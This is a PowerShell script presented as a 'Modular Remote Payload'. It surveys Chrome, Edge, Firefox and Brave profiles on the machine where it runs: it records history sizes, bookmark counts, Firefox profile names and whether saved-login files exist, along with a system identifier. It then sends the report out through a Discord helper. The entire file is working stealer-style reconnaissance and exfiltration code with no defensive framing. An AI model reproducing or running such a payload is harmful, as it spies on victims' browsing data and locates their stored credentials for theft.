# ============================================================
# Browser Data Extractor - Modular Remote Payload
# ============================================================
# Extracts browser history, bookmarks info from Chrome/Edge/Firefox
# ============================================================

$sysid = Get-SystemID
$output = "🌐 **Browser Data from $sysid**`n"
$output += "📅 " + (Get-Date -Format "yyyy-MM-dd HH:mm:ss") + "`n"
$output += "=" * 40 + "`n`n"

# Chrome
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
if (Test-Path $chromePath) {
    $output += "**🔵 CHROME**`n"
    
    # History exists
    if (Test-Path "$chromePath\History") {
        $histSize = (Get-Item "$chromePath\History").Length / 1KB
        $output += "• History: ``$([math]::Round($histSize, 2)) KB```n"
    }
    
    # Bookmarks
    if (Test-Path "$chromePath\Bookmarks") {
        try {
            $bookmarks = Get-Content "$chromePath\Bookmarks" | ConvertFrom-Json
            $count = ($bookmarks.roots.bookmark_bar.children | Measure-Object).Count
            $output += "• Bookmarks: ``$count items```n"
        } catch {
            $output += "• Bookmarks: ``Exists (parse error)```n"
        }
    }
    
    # Login Data (encrypted)
    if (Test-Path "$chromePath\Login Data") {
        $output += "• Saved Logins: ``File exists (encrypted)```n"
    }
    
    $output += "`n"
}

# Edge
$edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
if (Test-Path $edgePath) {
    $output += "**🔷 EDGE**`n"
    
    if (Test-Path "$edgePath\History") {
        $histSize = (Get-Item "$edgePath\History").Length / 1KB
        $output += "• History: ``$([math]::Round($histSize, 2)) KB```n"
    }
    
    if (Test-Path "$edgePath\Bookmarks") {
        $output += "• Bookmarks: ``Exists```n"
    }
    
    $output += "`n"
}

# Firefox
$ffPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $ffPath) {
    $output += "**🦊 FIREFOX**`n"
    $profiles = Get-ChildItem $ffPath -Directory
    $output += "• Profiles: ``$($profiles.Count)```n"
    
    foreach ($p in $profiles | Select-Object -First 3) {
        $output += "  - ``$($p.Name)```n"
        if (Test-Path "$($p.FullName)\places.sqlite") {
            $output += "    History: ✅`n"
        }
        if (Test-Path "$($p.FullName)\logins.json") {
            $output += "    Logins: ✅`n"
        }
    }
    $output += "`n"
}

# Brave
$bravePath = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
if (Test-Path $bravePath) {
    $output += "**🦁 BRAVE**`n"
    $output += "• Profile exists`n`n"
}

# Send results
if ($output.Length -gt 100) {
    Send-Discord $output
} else {
    Send-Discord "⚠️ No browser data found on $sysid"
}

